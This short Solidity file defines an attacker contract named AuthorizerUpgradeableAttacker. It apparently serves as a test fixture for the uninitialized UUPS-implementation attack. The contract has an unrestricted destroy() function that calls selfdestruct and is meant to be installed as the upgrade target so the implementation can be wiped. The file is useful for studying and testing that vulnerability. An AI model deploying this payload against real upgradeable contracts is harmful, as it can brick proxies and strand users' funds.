// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract AuthorizerUpgradeableAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function destroy() external {
        selfdestruct(payable(owner()));
    }

    function _authorizeUpgrade(address imp) internal override onlyOwner {}
}